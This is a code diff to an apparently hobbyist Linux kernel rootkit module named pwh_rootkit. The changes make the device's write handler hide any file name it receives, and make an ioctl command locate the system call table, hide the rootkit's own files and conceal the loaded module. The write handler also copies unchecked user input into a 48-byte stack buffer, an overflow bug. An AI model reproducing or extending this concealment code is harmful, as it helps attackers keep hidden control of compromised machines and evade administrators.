@@ -25,6 +25,11 @@ ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff
     return 0;
 }
 ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
+    size_t ret;
+    char filename[0x30] = {0};
+    ret = copy_from_user(filename, buf, count);
+
+    file_hidden(filename);
     return 0;
 }
 
@@ -46,7 +51,12 @@ long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
         case SUPER_HOOK:
                 /* 寻找系统调用表 */
             sys_call_table_finder();
-            dir_hidden_weak("haaaa");
+            file_hidden("pwhkit.ko");
+            file_hidden("use");
+            file_hidden("sys_table_finder");
+            module_hidden();
+
+            // dir_hidden_weak("haaaa");
 
             // hooked_addr = ((size_t *)syscall_table_addr)[217];
             // //orig_modifier(hooked_addr, (size_t)&funny_joke);
